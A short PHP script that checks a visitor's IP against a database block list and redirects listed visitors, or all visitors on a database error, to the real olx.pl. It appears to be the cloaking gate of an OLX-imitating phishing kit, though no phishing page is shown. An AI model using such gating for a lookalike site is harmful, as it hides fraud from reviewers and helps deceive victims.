<?php
include "config.php";

function getIp() {
    $keys = [
      'HTTP_CLIENT_IP',
      'HTTP_X_FORWARDED_FOR',
      'REMOTE_ADDR'
    ];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = trim(end(explode(',', $_SERVER[$key])));
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
}

$mysqli = new mysqli($config["database"]["hostname"], $config["database"]["username"], $config["database"]["password"], $config["database"]["name"]);

if ($mysqli->connect_errno) {
    header("Location: https://olx.pl");
    exit();
}

$ip = getIp();
$blackList = $mysqli->query("SELECT * FROM ip_block WHERE ip = \"$ip\"");

if ($blackList->num_rows > 0) {
    header("Location: https://olx.pl");
    exit();
}

$blackList->close();
?> 